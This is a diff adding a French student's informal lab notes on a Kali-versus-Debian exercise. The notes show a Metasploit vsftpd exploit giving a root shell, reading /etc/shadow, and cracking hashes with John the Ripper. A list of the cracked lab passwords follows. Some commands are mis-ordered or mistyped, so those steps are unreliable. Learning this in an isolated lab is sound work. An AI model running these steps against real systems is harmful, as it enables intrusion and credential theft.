@@ -1,0 +1,59 @@
+vm kali :
+
+John the Ripper : chope les mots de passe
+Les mots de passe sont dans le dossier shadow
+
+
+commandes :
+
+nmap adresse.ip : interdit sur réseau public ! Teste quels ports sont ouverts
+
+nmap montre qu'un port est ouverrt pour vfstpd
+
+msfvenom :
+msfconsole : 
+
+dans la console metasploit :
+	search vfstpd : montre les exploits pour vfstpd
+
+	use 1
+	options
+	set RHOSTS 172.16.0.101
+	options
+	exploit : lancer l'exploit
+
+	On entre dans un shell de la cible :
+
+		whoami : root
+		cat /etc/passwd
+		cat /etc/shadow
+
+
+TP :
+
+Une vm Kali, une vm Debian (serveur web). Dans virtualbox, on paramètre le réseau. Désactiver l'interface 1, activer l'interface 2 avec réseau privé hôte.
+
+Pinger les deux machines pour vérifier qu'elles sont bien joignables. Se connecter depuis Kali à au compte etudiant de Debian via ssh. Puis su pour s'identifier en tant root.
+
+cat /etc/passwd où sont stockés les mots de passe
+cat /etc/shadow qui cache les mots de passe
+
+Stocker les deux sorties dans deux fichiers différents.
+
+John the Ripper utilisera le fichier shadow et le fichier passwd pour en générer un nouveau (mypasswd).
+Ensuite : unshadow mypasswd
+Ensuite : john --show mypasswd
+Puis : john --wordlist=/usrshare/john/password.lst --rules mypasswd --format=crypt
+
+John se sert de password.lst comme dictionnaire et décrypte les mots de passe de mypasswd.
+
+
+mots de passe :
+
+alice : P@ssW0rd !!
+bob :   AdminWEBegnaro!
+root :  Rootsio2017
+etudiant : Btssio2017
+
+
+
